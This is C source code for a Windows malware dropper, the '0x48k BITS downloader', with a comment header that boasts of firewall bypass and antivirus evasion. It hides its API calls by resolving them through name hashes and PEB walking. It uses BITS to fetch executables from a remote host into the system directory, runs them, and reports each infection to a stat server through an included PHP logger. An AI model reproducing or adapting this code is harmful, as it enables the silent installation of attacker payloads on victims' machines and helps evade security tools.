/* 
        0x48k BITS DOWNLOADER 
        FEATURES 
        - downloading manual number of files 
        - report to stat script, if downloading success (for each file) 
        - using BITS (Background Intelligent Transfer Service) for downloading 
        - bypass most of firewalls (thanks to BITS =)) 
    - not using import table, for better av-stealth) 
        - small size (above 1.7k with FSG) 
        PRIVATE SOURE CODE BY Cr4sh =\ 
http://allmyhate.host.sk 
        compile with Microsoft Visual C++ 
     _ _     _ _ _ __     _      _   _       
        | || |___| | | |/ /_ _ (_)__ _| |_| |_ ___ 
        | __ / -_) | | ' <| ' \| / _` | ' \ _(_-< 
        |_||_\___|_|_|_|\_\_||_|_\__, |_||_\__/__/ 
             hellknights.void.ru |___/ .0x48k.   
        t h e   m a i n e s t   e v i l   o f   r u n e t 
*/ 
//-------------------------------------------------------------------------------------- 
#define _WIN32_WINNT 0x0500 
#include <windows.h> 
#include <wininet.h> 
#include <comdef.h> 
#include <bits.h> 
#pragma comment(linker,"/ENTRY:WinMain") 
#pragma comment(lib,"wininet.lib") 
//----------------------------------------- 
// files to download 
wchar_t *filelist[] = 
{ 
        L"http://192.168.0.1/1.exe", 
        L"http://192.168.0.1/2.exe" 
}; 
// number of files to download 
#define FNUM        2 
//----------------------------------------- 
// comment it, if you dont need reporting to stat 
#define SREPORT 
// stat-server addr 
#define SADDR        "192.168.0.1" 
// path to script, for statistic collecting 
#define SPATH        "stat.php" 
// this script may looks like there: 
/* 
        <?php 
                $log = "downloads.log"; 
                $url = @$_POST['ok']; 
                if (empty($url)) exit; 
   
                $f = fopen($log, 'a+'); 
                if (!$f) exit; 
                fwrite($f, date("d.m.y-H:i:s", time())."\t{$_SERVER['REMOTE_ADDR']}\t$url OK\r\n"); 
                 
                fclose($f); 
        ?> 
*/ 
//---------------------------------------------------------------------------------------------- 
LPVOID GetProcAddressEx(DWORD dwModule, DWORD dwProcNameHash); 
// templates for APIs calling 
template <DWORD h, DWORD hash> 
inline LPVOID pushargEx() 
{         
        typedef LPVOID (WINAPI *newfunc)(); 
        newfunc func = (newfunc)GetProcAddressEx(h, hash); 
        return func(); 
} 
template <DWORD h, DWORD hash, class A> 
inline LPVOID pushargEx(A a1) 
{         
        typedef LPVOID (WINAPI *newfunc)(A); 
        newfunc func = (newfunc)GetProcAddressEx(h, hash); 
        return func(a1); 
} 
template <DWORD h, DWORD hash, class A, class B> 
inline LPVOID pushargEx(A a1, B a2) 
{         
        typedef LPVOID (WINAPI *newfunc)(A, B); 
        newfunc func = (newfunc)GetProcAddressEx(h, hash); 
        return func(a1,a2); 
} 
template <DWORD h, DWORD hash, class A, class B, class C> 
inline LPVOID pushargEx(A a1, B a2, C a3) 
{ 
        typedef LPVOID (WINAPI *newfunc)(A, B, C); 
        newfunc func = (newfunc)GetProcAddressEx(h, hash); 
        return func(a1,a2,a3); 
} 
template <DWORD h, DWORD hash, class A, class B, class C, class D> 
inline LPVOID pushargEx(A a1, B a2, C a3, D a4) 
{         
        typedef LPVOID (WINAPI *newfunc)(A, B, C, D); 
        newfunc func = (newfunc)GetProcAddressEx(h, hash); 
        return func(a1,a2,a3,a4); 
} 
template <DWORD h, DWORD hash, class A, class B, class C, class D, class E> 
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5) 
{         
        typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E); 
        newfunc func = (newfunc)GetProcAddressEx(h, hash); 
        return func(a1, a2, a3, a4, a5); 
} 
template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H> 
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8) 
{         
        typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H); 
        newfunc func = (newfunc)GetProcAddressEx(h, hash); 
        return func(a1, a2, a3, a4, a5, a6, a7, a8); 
} 
template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H, class I> 
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9) 
{         
        typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I); 
        newfunc func = (newfunc)GetProcAddressEx(h, hash); 
        return func(a1, a2, a3, a4, a5, a6, a7, a8, a9); 
} 
template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X> 
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10) 
{         
        typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X); 
        newfunc func = (newfunc)GetProcAddressEx(h, hash); 
        return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10); 
} 
//---------------------------------------------------------------------------------------------- 
// needed APIs 
// kernel32.dll 
#define GCreateProcessW                        pushargEx<1, 0x46318AD1> 
#define GExitProcess                        pushargEx<1, 0x95902B19> 
#define GGetSystemDirectoryW        pushargEx<1, 0x49A1375C> 
#define GGetModuleHandleA                pushargEx<1, 0xA48D6762> 
#define GGetTempFileNameW                pushargEx<1, 0x0FA4F514> 
#define GLoadLibraryA                        pushargEx<1, 0xC8AC8026> 
#define GSleep                                        pushargEx<1, 0x3D9972F5> 
// wininet.dll 
#define GHttpOpenRequestA                pushargEx<2, 0x1510002F> 
#define GHttpSendRequestW                pushargEx<2, 0x9F13857C> 
#define GInternetCloseHandle        pushargEx<2, 0x7314FB0C> 
#define GInternetConnectA                pushargEx<2, 0xBE618D3E> 
#define GInternetOpenA                        pushargEx<2, 0x08593DD7> 
// ole32.dll 
#define GCoCreateInstance                pushargEx<3, 0x368435BE> 
#define GCoInitializeEx                        pushargEx<3, 0x7573DE28> 
#define GCoInitializeSecurity        pushargEx<3, 0x910EACB3> 
#define GCoUninitialize                        pushargEx<3, 0xEDB3159D> 
//---------------------------------------------------------------------------------------------- 
inline HMODULE GetKernel32(void) 
{ 
        __asm 
        { 
                mov                eax,dword ptr fs:[30h] 
        mov                eax,dword ptr [eax+0ch] 
        mov                esi,dword ptr [eax+1ch] 
        lodsd 
                mov                eax,dword ptr [eax+08h] 
        } 
} 
//---------------------------------------------------------------------------------------------- 
inline DWORD CalcHash(char *str) 
{ 
        DWORD hash = 0; 
        char* copystr = str; 
        while(*copystr) 
        { 
                hash = ((hash << 7) & (DWORD)(-1))|(hash >> (32-7)); 
                hash = hash^(*copystr); 
                copystr++; 
        } 
        return hash; 
} 
//---------------------------------------------------------------------------------------------- 
#define RVATOVA( base, offset ) ( (DWORD)base + (DWORD)offset ) 
// return addr of API function by hash of it's name 
LPVOID GetProcAddressEx(DWORD dwModule, DWORD dwProcNameHash) 
{ 
        HMODULE hModule; 
        switch (dwModule) 
        { 
                case 1: 
                hModule = GetKernel32(); 
                break; 
                case 2: 
                hModule = (HMODULE)GLoadLibraryA("wininet.dll"); 
                break; 
                case 3: 
                hModule = (HMODULE)GLoadLibraryA("ole32.dll"); 
                break; 
                default: 
                return 0; 
        } 
        PIMAGE_OPTIONAL_HEADER poh = (PIMAGE_OPTIONAL_HEADER) 
                ((char*)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew + 
                        sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)); 
        PIMAGE_EXPORT_DIRECTORY ped = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(hModule, 
                poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);         
         
        int nOrdinal; 
        if (HIWORD((DWORD)dwProcNameHash) == 0) 
        { 
                nOrdinal = (LOWORD((DWORD)dwProcNameHash)) - ped->Base; 
        } else { 
                DWORD *pdwNamePtr = (DWORD*)RVATOVA(hModule, ped->AddressOfNames); 
                WORD *pwOrdinalPtr = (WORD*)RVATOVA(hModule, ped->AddressOfNameOrdinals); 
                for (unsigned int i = 0; i < ped->NumberOfNames; i++, pdwNamePtr++, pwOrdinalPtr++) 
                { 
                        if (CalcHash((char*)RVATOVA(hModule, *pdwNamePtr)) == dwProcNameHash) 
                        { 
                                nOrdinal = *pwOrdinalPtr; 
                                break; 
                        } 
                } 
                if (i == ped->NumberOfNames) 
                        return 0; 
        } 
        PDWORD pAddrTable = (PDWORD)RVATOVA(hModule, ped->AddressOfFunctions); 
        DWORD dwRVA = pAddrTable[nOrdinal]; 
        DWORD ret = (DWORD)RVATOVA(hModule, dwRVA); 
        return (LPVOID)ret; 
} 
//---------------------------------------------------------------------------------------------- 
#ifdef SREPORT 
void ReportToStat(wchar_t *data) 
{ 
        HINTERNET hSession = GInternetOpenA("bitsldr", LOCAL_INTERNET_ACCESS, NULL, 
                INTERNET_INVALID_PORT_NUMBER, INTERNET_FLAG_DONT_CACHE); 
        HINTERNET hConnect = GInternetConnectA(hSession, SADDR, INTERNET_DEFAULT_HTTP_PORT, 
                NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL); 
        if (hConnect == NULL) 
                goto end; 
        HINTERNET hRequest = GHttpOpenRequestA(hConnect, "POST", SPATH, NULL, NULL, NULL, NULL, NULL); 
        if (hRequest == NULL) 
                goto end; 
        wchar_t post_data[255]; 
        wcscpy(post_data, L"ok="); 
        wcscat(post_data, data); 
                 
        wchar_t *headers = L"Content-Type: application/x-www-form-urlencoded";         
                 
        GHttpSendRequestW(hRequest, headers, wcslen(headers), post_data, wcslen(post_data)); 
end: 
        GInternetCloseHandle(hRequest); 
        GInternetCloseHandle(hConnect); 
        GInternetCloseHandle(hSession); 
} 
#endif 
//---------------------------------------------------------------------------------------------- 
int APIENTRY WinMain(HINSTANCE hInstance, 
                     HINSTANCE hPrevInstance, 
                     LPTSTR    lpCmdLine, 
                     int       nCmdShow) 
{ 
        IBackgroundCopyManager *pManager = NULL; 
        GUID JobId; 
        IBackgroundCopyJob* pJob = NULL; 
        BG_JOB_STATE pJobState; 
        wchar_t tmp_path[MAX_PATH]; 
        wchar_t sys_dir[MAX_PATH]; 
        GGetSystemDirectoryW(sys_dir, MAX_PATH); 
        HRESULT hr = (HRESULT)GCoInitializeEx(NULL, COINIT_APARTMENTTHREADED); 
         
        hr = (HRESULT)GCoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, 
                RPC_C_IMP_LEVEL_DELEGATE, NULL, EOAC_NONE, 0); 
    hr = CoCreateInstance(__uuidof(BackgroundCopyManager), NULL, CLSCTX_ALL, 
                __uuidof(IBackgroundCopyManager), (void **)&pManager); 
        if (pManager) 
    { 
                for (int i = 0; i < FNUM; i++) 
                { 
                        // create new job 
                        hr = pManager->CreateJob(L"bitsldr", BG_JOB_TYPE_DOWNLOAD, &JobId, &pJob); 
                        if (SUCCEEDED(hr)) 
                        { 
                                GGetTempFileNameW(sys_dir, L"LDR", 0, tmp_path); 
                                // add file to job 
                                hr = pJob->AddFile(filelist, tmp_path); 
                                if (SUCCEEDED(hr)) 
                                {                 
                                        // start transfer 
                                        hr = pJob->Resume(); 
                                        if (SUCCEEDED(hr)) 
                                        { 
                                                while (true) 
                                                { 
                                                        // wait until job incomplete 
                                                        hr = pJob->GetState(&pJobState); 
                                                         
                                                        if (SUCCEEDED(hr) && 
                                                                (pJobState == BG_JOB_STATE_CONNECTING || 
                                                                pJobState == BG_JOB_STATE_TRANSFERRING)) 
                                                        { 
                                                                GSleep(10); 
                                                        } else { 
                                                                break; 
                                                        } 
                                                } 
                                        } 
                                } 
                                pJob->Complete(); 
                                pJob->Release(); 
                                STARTUPINFOW si = { sizeof(si) }; 
                                PROCESS_INFORMATION pi; 
                                // try to create process 
                                if (GCreateProcessW(NULL, tmp_path, NULL, NULL, FALSE, 0, 
                                        NULL, NULL, &si, &pi)) 
                                { 
#ifdef SREPORT 
                                        // send report to stat 
                                        ReportToStat(filelist); 
#endif 
                                } 
                        } 
                } 
                pManager->Release(); 
    } 
    GCoUninitialize(); 
        GExitProcess(0); 
        return 0; 
} 
//----------------------------------------------------------------------------------------------